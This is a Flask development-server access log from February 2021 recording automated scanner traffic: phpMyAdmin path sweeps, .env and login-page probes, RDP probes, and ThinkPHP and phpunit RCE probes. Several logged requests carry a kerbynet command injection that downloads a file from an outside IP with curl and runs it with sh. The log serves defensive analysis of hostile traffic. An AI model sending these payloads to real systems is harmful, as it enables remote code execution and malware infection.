 * Serving Flask app "app" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
192.71.225.127 - - [14/Feb/2021 03:09:59] "[33mGET /ads.txt HTTP/1.1[0m" 404 -
192.71.12.140 - - [14/Feb/2021 03:10:15] "[37mGET / HTTP/1.1[0m" 200 -
173.231.59.202 - - [14/Feb/2021 03:13:07] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
173.231.59.202 - - [14/Feb/2021 03:13:51] "[37mGET / HTTP/1.1[0m" 200 -
52.141.57.203 - - [14/Feb/2021 03:18:15] "[33mGET /login HTTP/1.0[0m" 404 -
52.141.57.203 - - [14/Feb/2021 03:18:15] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
52.141.57.203 - - [14/Feb/2021 03:18:15] "[33mGET /manager/html HTTP/1.1[0m" 404 -
52.141.57.203 - - [14/Feb/2021 03:18:15] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
222.79.45.101 - - [14/Feb/2021 03:48:58] "[37mGET / HTTP/1.1[0m" 200 -
61.219.11.153 - - [14/Feb/2021 03:51:26] "[37mGET / HTTP/1.1[0m" 200 -
71.6.199.23 - - [14/Feb/2021 04:25:41] "[37mGET / HTTP/1.1[0m" 200 -
71.6.199.23 - - [14/Feb/2021 04:25:42] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
71.6.199.23 - - [14/Feb/2021 04:25:43] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
71.6.199.23 - - [14/Feb/2021 04:25:43] "[33mGET /.well-known/security.txt HTTP/1.1[0m" 404 -
71.6.199.23 - - [14/Feb/2021 04:25:44] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
34.78.227.165 - - [14/Feb/2021 04:25:49] "[37mGET / HTTP/1.1[0m" 200 -
128.65.181.223 - - [14/Feb/2021 04:28:32] "[37mGET / HTTP/1.1[0m" 200 -
123.253.127.116 - - [14/Feb/2021 04:49:04] "[37mGET / HTTP/1.1[0m" 200 -
39.98.209.43 - - [14/Feb/2021 05:48:08] "[33mGET /phpmyAdmin/ HTTP/1.1[0m" 404 -
39.98.209.43 - - [14/Feb/2021 05:48:12] "[33mGET /phpmyAdmin/ HTTP/1.1[0m" 404 -
39.98.209.43 - - [14/Feb/2021 05:48:15] "[33mGET /pmD/ HTTP/1.1[0m" 404 -
39.98.209.43 - - [14/Feb/2021 05:48:20] "[33mGET /pmD/ HTTP/1.1[0m" 404 -
39.98.209.43 - - [14/Feb/2021 05:48:23] "[33mGET /pmA/ HTTP/1.1[0m" 404 -
39.98.209.43 - - [14/Feb/2021 05:48:27] "[33mGET /pmA/ HTTP/1.1[0m" 404 -
39.98.209.43 - - [14/Feb/2021 05:48:31] "[33mGET /phpmyAdmin4.8.5/ HTTP/1.1[0m" 404 -
39.98.209.43 - - [14/Feb/2021 05:48:34] "[33mGET /phpmyAdmin4.8.5/ HTTP/1.1[0m" 404 -
129.213.20.146 - - [14/Feb/2021 05:56:13] "[33mGET /.env HTTP/1.1[0m" 404 -
129.213.20.146 - - [14/Feb/2021 05:56:15] "[31m[1mPOST / HTTP/1.1[0m" 405 -
129.213.20.146 - - [14/Feb/2021 05:56:17] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
139.162.119.197 - - [14/Feb/2021 05:59:53] "[37mGET / HTTP/1.1[0m" 200 -
194.126.183.159 - - [14/Feb/2021 06:25:03] "[37mGET / HTTP/1.1[0m" 200 -
34.96.130.219 - - [14/Feb/2021 08:23:35] "[37mGET / HTTP/1.1[0m" 200 -
65.49.20.66 - - [14/Feb/2021 08:46:05] "[37mGET / HTTP/1.1[0m" 200 -
66.249.70.22 - - [14/Feb/2021 09:58:09] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
66.249.70.24 - - [14/Feb/2021 09:58:10] "[37mGET / HTTP/1.1[0m" 200 -
104.140.188.46 - - [14/Feb/2021 09:59:26] "[37mGET / HTTP/1.1[0m" 200 -
202.29.211.11 - - [14/Feb/2021 10:54:09] "[33mGET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:09] "[33mGET /phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:09] "[33mGET /phpmyadmin/scripts/setup.php/index.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:10] "[33mGET /scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:10] "[33mGET /pma/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:10] "[33mGET /php/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:11] "[33mGET /wordpress/wp-content/plugins/wp-phpmyadmin/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:11] "[33mGET /wp/wp-content/plugins/wp-phpmyadmin/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:11] "[33mGET /dbadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:12] "[33mGET /mysqladmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:12] "[33mGET /admin/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:12] "[33mGET /mysql/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:12] "[33mGET /myadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:13] "[33mGET /phpadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:13] "[33mGET /phpmyadmin3/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:13] "[33mGET /adm/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:13] "[33mGET /phpdbku/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:14] "[33mGET /web/phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:14] "[33mGET /phpmy/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:14] "[33mGET /phpmyadmin.box25/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:15] "[33mGET /mysql4/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:15] "[33mGET /phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:15] "[33mGET /acehorseracingbets-lays/db/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:15] "[33mGET /phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:16] "[33mGET /phpMyAdmin-www072510/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:16] "[33mGET /secret123/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:16] "[33mGET /alt/sqladmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:17] "[33mGET /phpMyAdminold/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:17] "[33mGET /mysqladminhksin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:17] "[33mGET /phpMyAdmin2/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:17] "[33mGET /phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:18] "[33mGET /_phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:18] "[33mGET /configuracion/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:18] "[33mGET /~phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:19] "[33mGET /phpMyAdmin-2.8.0.4/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:19] "[33mGET /admincooptel/phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:19] "[33mGET /pyaniste/mysqladmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:19] "[33mGET /sqladmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:20] "[33mGET /php/phpmyadmin2102/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:20] "[33mGET /mmss/phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:20] "[33mGET /~riba/pma/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:21] "[33mGET /php/phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:21] "[33mGET /db/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:21] "[33mGET /downloads/SemanaAcademica2007/MC07_Ajax/server/www/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:21] "[33mGET /ext/ma/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:22] "[33mGET /phpmyadmin_/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:22] "[33mGET /phpmyadmin/scripts/setup.ph HTTP/1.1[0m" 404 -
202.29.211.11 - - [14/Feb/2021 10:54:22] "[33mGET /phpMyAdmin-2.8.2/scripts/setup.php HTTP/1.1[0m" 404 -
185.156.72.8 - - [14/Feb/2021 10:55:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.156.72.8 - - [14/Feb/2021 10:55:46] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.156.72.8 - - [14/Feb/2021 10:55:47] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.156.72.8 - - [14/Feb/2021 10:55:47] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.156.72.8 - - [14/Feb/2021 11:20:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.156.72.8 - - [14/Feb/2021 11:20:32] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.156.72.8 - - [14/Feb/2021 11:20:34] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.156.72.8 - - [14/Feb/2021 11:20:34] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
13.66.139.74 - - [14/Feb/2021 11:46:51] "[37mGET / HTTP/1.1[0m" 200 -
185.156.72.8 - - [14/Feb/2021 11:48:14] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.156.72.8 - - [14/Feb/2021 11:48:14] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
167.172.58.14 - - [14/Feb/2021 12:02:49] "[37mGET / HTTP/1.1[0m" 200 -
185.156.72.8 - - [14/Feb/2021 12:16:00] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.156.72.8 - - [14/Feb/2021 12:16:00] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.156.72.8 - - [14/Feb/2021 12:16:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.156.72.8 - - [14/Feb/2021 12:16:01] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.154.255.147 - - [14/Feb/2021 14:06:13] "[37mGET / HTTP/1.1[0m" 200 -
193.118.53.210 - - [14/Feb/2021 14:37:07] "[37mGET / HTTP/1.1[0m" 200 -
209.141.60.60 - - [14/Feb/2021 15:07:40] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
157.245.120.130 - - [14/Feb/2021 15:14:34] "[33mGET /login HTTP/1.0[0m" 404 -
157.245.120.130 - - [14/Feb/2021 15:14:35] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
157.245.120.130 - - [14/Feb/2021 15:14:35] "[33mGET /manager/html HTTP/1.1[0m" 404 -
157.245.120.130 - - [14/Feb/2021 15:14:36] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
104.46.110.208 - - [14/Feb/2021 15:25:10] "[31m[1mPOST / HTTP/1.1[0m" 405 -
138.68.6.48 - - [14/Feb/2021 16:03:46] "[33mGET /.env HTTP/1.1[0m" 404 -
138.68.6.48 - - [14/Feb/2021 16:03:47] "[31m[1mPOST / HTTP/1.1[0m" 405 -
218.2.106.125 - - [14/Feb/2021 16:43:38] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
61.155.0.253 - - [14/Feb/2021 16:43:38] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
61.155.0.253 - - [14/Feb/2021 16:43:38] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
218.2.106.125 - - [14/Feb/2021 16:43:40] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
45.155.205.108 - - [14/Feb/2021 17:18:30] "[33mPOST /api/jsonws/invoke HTTP/1.1[0m" 404 -
45.155.205.108 - - [14/Feb/2021 17:18:30] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
45.155.205.108 - - [14/Feb/2021 17:18:31] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1[0m" 404 -
45.155.205.108 - - [14/Feb/2021 17:18:31] "[37mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 200 -
45.155.205.108 - - [14/Feb/2021 17:18:31] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
45.155.205.108 - - [14/Feb/2021 17:18:32] "[33mGET /console/ HTTP/1.1[0m" 404 -
45.155.205.108 - - [14/Feb/2021 17:18:32] "[33mGET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1[0m" 404 -
45.155.205.108 - - [14/Feb/2021 17:18:33] "[33mPOST /Autodiscover/Autodiscover.xml HTTP/1.1[0m" 404 -
45.155.205.108 - - [14/Feb/2021 17:18:33] "[33mGET /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.155.205.108 - - [14/Feb/2021 17:18:33] "[37mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1[0m" 200 -
45.155.205.108 - - [14/Feb/2021 17:18:34] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
218.2.106.125 - - [14/Feb/2021 17:28:05] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
218.2.106.125 - - [14/Feb/2021 17:28:06] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
218.2.106.125 - - [14/Feb/2021 17:28:07] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
61.155.0.253 - - [14/Feb/2021 17:28:07] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
218.2.106.125 - - [14/Feb/2021 18:33:40] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
61.155.0.253 - - [14/Feb/2021 18:33:40] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
61.155.0.253 - - [14/Feb/2021 18:33:41] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
45.83.64.120 - - [14/Feb/2021 19:17:23] "[37mGET / HTTP/1.1[0m" 200 -
66.249.70.26 - - [14/Feb/2021 19:34:51] "[37mGET /static/united-states-of-america.png HTTP/1.1[0m" 200 -
209.17.97.90 - - [14/Feb/2021 20:03:44] "[37mGET / HTTP/1.0[0m" 200 -
77.49.22.21 - - [14/Feb/2021 20:21:35] "[37mGET / HTTP/1.1[0m" 200 -
61.155.0.253 - - [14/Feb/2021 20:21:50] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
66.249.70.22 - - [14/Feb/2021 20:34:51] "[37mGET /static/img_home.jpg HTTP/1.1[0m" 200 -
162.142.125.38 - - [14/Feb/2021 20:52:39] "[37mGET / HTTP/1.1[0m" 200 -
162.142.125.38 - - [14/Feb/2021 20:52:40] "[37mGET / HTTP/1.1[0m" 200 -
187.108.67.190 - - [14/Feb/2021 21:25:20] "[37mGET / HTTP/1.1[0m" 200 -
62.210.188.218 - - [14/Feb/2021 21:26:16] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
139.162.145.250 - - [14/Feb/2021 21:26:24] "[33mGET /bag2 HTTP/1.1[0m" 404 -
62.210.188.218 - - [14/Feb/2021 21:26:25] "[37mGET /latest HTTP/1.1[0m" 200 -
62.210.188.218 - - [14/Feb/2021 21:26:35] "[37mGET /hottest HTTP/1.1[0m" 200 -
218.2.106.125 - - [14/Feb/2021 22:52:22] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
209.17.97.74 - - [14/Feb/2021 22:55:26] "[37mGET / HTTP/1.1[0m" 200 -
209.17.96.226 - - [14/Feb/2021 23:01:21] "[37mGET / HTTP/1.1[0m" 200 -
37.120.239.83 - - [14/Feb/2021 23:03:15] "[33mGET /.env HTTP/1.1[0m" 404 -
37.120.239.83 - - [14/Feb/2021 23:03:15] "[31m[1mPOST / HTTP/1.1[0m" 405 -
209.17.97.42 - - [14/Feb/2021 23:16:20] "[37mGET / HTTP/1.0[0m" 200 -
202.29.211.11 - - [15/Feb/2021 00:29:15] "[33mGET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:15] "[33mGET /phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:15] "[33mGET /phpmyadmin/scripts/setup.php/index.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:16] "[33mGET /scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:16] "[33mGET /pma/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:16] "[33mGET /php/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:17] "[33mGET /wordpress/wp-content/plugins/wp-phpmyadmin/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:17] "[33mGET /wp/wp-content/plugins/wp-phpmyadmin/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:17] "[33mGET /dbadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:18] "[33mGET /mysqladmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:18] "[33mGET /admin/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:18] "[33mGET /mysql/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:18] "[33mGET /myadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:19] "[33mGET /phpadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:19] "[33mGET /phpmyadmin3/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:19] "[33mGET /adm/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:20] "[33mGET /phpdbku/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:23] "[33mGET /phpmy/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:23] "[33mGET /phpmyadmin.box25/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:23] "[33mGET /mysql4/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:24] "[33mGET /phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:24] "[33mGET /acehorseracingbets-lays/db/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:24] "[33mGET /phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:25] "[33mGET /phpMyAdmin-www072510/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:25] "[33mGET /secret123/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:25] "[33mGET /alt/sqladmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:26] "[33mGET /phpMyAdminold/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:26] "[33mGET /mysqladminhksin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:26] "[33mGET /phpMyAdmin2/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:27] "[33mGET /phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:27] "[33mGET /_phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:27] "[33mGET /configuracion/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:27] "[33mGET /~phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:28] "[33mGET /phpMyAdmin-2.8.0.4/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:28] "[33mGET /admincooptel/phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:28] "[33mGET /pyaniste/mysqladmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:29] "[33mGET /sqladmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:29] "[33mGET /php/phpmyadmin2102/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:29] "[33mGET /mmss/phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:29] "[33mGET /~riba/pma/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:30] "[33mGET /php/phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:30] "[33mGET /db/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:30] "[33mGET /downloads/SemanaAcademica2007/MC07_Ajax/server/www/phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:30] "[33mGET /ext/ma/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:31] "[33mGET /phpmyadmin_/scripts/setup.php HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:31] "[33mGET /phpmyadmin/scripts/setup.ph HTTP/1.1[0m" 404 -
202.29.211.11 - - [15/Feb/2021 00:29:32] "[33mGET /phpMyAdmin-2.8.2/scripts/setup.php HTTP/1.1[0m" 404 -
162.142.125.40 - - [15/Feb/2021 00:33:10] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\'ø¦4"\x86n\x05;Efê\x1b°H_')
